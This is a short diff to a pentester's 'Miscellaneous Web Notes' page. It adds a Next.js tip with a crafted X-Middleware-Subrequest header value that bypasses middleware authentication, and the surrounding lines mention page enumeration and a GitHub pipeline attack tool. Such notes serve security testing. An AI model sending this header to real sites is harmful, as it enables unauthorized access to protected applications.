@@ -33,6 +33,7 @@ pagetitle: Miscellaneous Web Notes
 
 ## Next.js
 - Use `__BUILD_MANIFEST.sortedPages` to see a list of all pages
+- Use `X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware` for the auth bypass when `X-Powered-By: Next.js`
 
 ## CICD
 - Use [Gato](https://github.com/praetorian-inc/gato) for enumerating/attacking Github pipeline
